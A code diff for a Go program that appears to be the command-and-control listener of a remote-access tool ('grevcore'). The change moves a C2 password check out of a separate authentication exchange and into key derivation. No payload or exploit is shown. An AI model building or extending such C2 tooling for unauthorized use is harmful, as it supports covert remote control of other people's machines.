@@ -46,38 +46,16 @@ func main() {
 
 		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())
 
-		key, err := grevcore.DeriveKey(conn)
+		key, err := grevcore.DeriveKey(conn, []byte(C2Password))
 
 		if err != nil {
 			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
-			return
-		}
-
-		if C2Password != "" && ! ValidAuth(conn, C2Password, key) {
-			grevcore.SendPacket(conn, grevcore.Packet{grevcore.AuthFail, "", nil}, key)
-			slog.Error("Invalid authentication.", "REMOTE", conn.RemoteAddr())
+			conn.Close()
 			continue
 		}
 
-		grevcore.SendPacket(conn, grevcore.PacketNil, key)
-		slog.Info("Successful Auth.", "REMOTE", conn.RemoteAddr())
-
 		ExecuteRequest(conn, key)
 	}
-}
-
-func ValidAuth(c net.Conn, C2Password string, key []byte) bool {
-	recv, err := grevcore.ReceivePacket(c, key)
-
-	if err != nil {
-		return false
-	}
-
-	if recv.Header != grevcore.AuthHeader {
-		return false
-	}
-
-	return string(recv.Data) == C2Password
 }
 
 func ExecuteRequest(c net.Conn, key []byte) {
